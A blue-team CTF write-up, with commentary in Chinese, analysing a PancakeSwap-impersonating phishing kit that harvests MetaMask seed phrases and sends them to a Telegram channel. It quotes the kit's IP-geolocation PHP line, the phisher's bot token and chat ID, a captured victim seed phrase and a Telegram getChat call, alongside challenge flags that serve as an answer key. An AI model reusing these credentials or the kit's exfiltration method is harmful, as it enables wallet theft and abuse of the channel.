---
title: CyberDefender - GrabThePhisher
tags: [CyberDefender, Threat Intel]

category: "Security｜Practice｜CyberDefender｜Threat Intel"
---

# CyberDefender - GrabThePhisher
<!-- more -->
Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/95

:::spoiler TOC
[TOC]
:::

## Scenario
> An attacker compromised a server and impersonated https://pancakeswap.finance/, a decentralized exchange native to BNB Chain, to host a phishing kit at https://apankewk.soup.xyz/mainpage.php. The attacker set it as an open directory with the file name "pankewk.zip". 
>
>Provided the phishing kit, you as a soc analyst are requested to analyze it and do your threat intel homework.

## ==Q1==
> Which wallet is used for asking the seed phrase? 

### Recon
從scenario就可以知道他大概是一個網站被攻擊後盜用，轉變成用來騙別人的釣魚網站，因此可以看一下整體的資料夾結構會發現他所採用的錢包就是metamask

:::spoiler Flag
Flag: `Metamask`
:::

## ==Q2==
> What is the file name that has the code for the phishing kit? 

### Recon
同上，只要觀察資料夾結構就可以知道有一個file叫做metamask.php

:::spoiler Flag
Flag: `metamask.php`
:::

## ==Q3==
> In which language was the kit written? 

### Recon
同上

:::spoiler Flag
Flag: `php`
:::

## ==Q4==
>What service does the kit use to retrieve the victim's machine information? 

### Recon
這個就比較有趣一點，通常問的應該是哪一個api之類的服務，所以應該要往這個方向想，看了一下`matamask.php`，裡面有提到
```php
$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
```
代表他所使用的應該是Sypex Geo這個service，查了一下，可以看一下[github repo](https://github.com/hostbrook/sypex-geo)，的確就像題目敘述一樣是可以藉由IP取得受害者機器的一些相關訊息

:::spoiler Flag
Flag: `Sypex Geo`
:::

## ==Q5==
>How many seed phrases were already collected? 

### Recon
我是直接看`/log/log.txt`的內容發現有三行，且每一行都有固定12個phrase，所以我猜應該已經取得三個受害電腦的seed phrase

:::spoiler Flag
Flag: `3`
:::

## ==Q6==
>Write down the seed phrase of the most recent phishing incident? 

### Exploit
同上，把最後一列的seed phrase貼上就對了

:::spoiler Flag
Flag: `father also recycle embody balance concert mechanic believe owner pair muffin hockey`
:::

## ==Q7==
> Which medium had been used for credential dumping? 

### Recon
如果仔細看`metamask.php`的後半段會發現他還有call到telegram的API，主要用途是拿取seed phrase，再把這些東西append到`/log/log.txt`中

:::spoiler Flag
Flag: `telegram`
:::

## ==Q8==
> What is the token for the channel? 

### Recon
同上

:::spoiler Flag
Flag: `5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10`
:::

## ==Q9==
> What is the chat ID of the phisher's channel? 

### Exploit
同上

:::spoiler Flag
Flag: `5442785564`
:::

## ==Q10==
> What are the allies of the phish kit developer? 

### Exploit
可以從註解當中看到j1j1b1s@m3r0這個人應該也有提供一些協助

:::spoiler Flag
Flag: `j1j1b1s@m3r0`
:::

## ==Q11==
> What is the full name of the Phish Actor? 

### Exploit
如果把檔案中提供的token/id當作TG的parameter會得到甚麼東西呢?$\to$`https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564`

![](https://hackmd.io/_uploads/HkeL-lHfp.png)

:::spoiler Flag
Flag: `Marcus Aurelius`
:::

## ==Q12==
> What is the username of the Phish Actor? 

### Exploit
同上

:::spoiler Flag
Flag: `pumpkinboii`
:::

## Reference
[A walkthrough of CyberDefenders “GrabThePhisher — Threat intel” CTF](https://medium.com/@eduzorkamsi/a-walkthrough-of-cyberdefenders-grabthephisher-threat-intel-ctf-dfdb4f8ce525)